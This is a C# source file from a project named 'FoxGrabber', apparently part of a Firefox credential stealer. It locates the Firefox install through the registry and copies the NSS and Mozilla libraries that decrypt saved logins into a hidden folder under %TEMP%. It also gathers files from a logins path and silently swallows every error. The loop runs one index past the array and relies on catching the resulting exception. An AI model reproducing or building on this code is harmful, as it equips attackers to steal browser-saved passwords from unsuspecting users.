namespace FoxGrabber
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Security;

    public class Searcher
    {
        private static readonly string TempDir = string.Concat(Environment.GetEnvironmentVariable("temp"), '\\');
        private static readonly string User_Name = string.Concat(TempDir, "Fox");

        public static List<string> GetDLLFox = new List<string>();

        public static string[] Massive = new string[]
        {
            "nss3.dll",      "mozglue.dll",
            "mozavutil.dll", "msvcp140.dll",
            "nssdbm3.dll",   "softokn3.dll", "nssckbi.dll",
            "msvcp120.dll",  "msvcr120.dll", 
        };

        private static void GetSecureFile(string PathLogins, string Pattern, SearchOption SO = SearchOption.TopDirectoryOnly)
        {
            try
            {
                foreach (string Mic in Directory.EnumerateFiles(PathLogins, Pattern, SO))
                {
                    if (!File.Exists(Mic))
                    {
                        continue;
                    }
                    else
                    {
                        GetDLLFox.Add(Mic);
                    }
                }
            }
            catch (UnauthorizedAccessException) { }
            catch (IOException) { }
            catch (SecurityException) { }
        }

        public static void CopyLoginsInSafeDir(bool Recursive = true)
        {
            try
            {
                HomeDirectory.Create(User_Name, Recursive);
                /*
                foreach (string ss in Massive)
                {
                    string FullDLL = Path.Combine(MozPath.GetRegistryFireFox(), ss.ToString());
                    Console.WriteLine(FullDLL);
                    File.Copy(FullDLL, Path.Combine(User_Name, Path.GetFileName(FullDLL)));
                }
                */
                
                for (int i = 0; i <= Massive.Length; i++)
                {
                    string FullDLL = Path.Combine(MozPath.GetRegistryFireFox(), Massive[i]);
                    File.Copy(FullDLL, Path.Combine(User_Name, Path.GetFileName(FullDLL)));
                }
                
            }
            catch (UnauthorizedAccessException) { }
            catch (IndexOutOfRangeException) { }
            catch (IOException) { }

        }
    }
}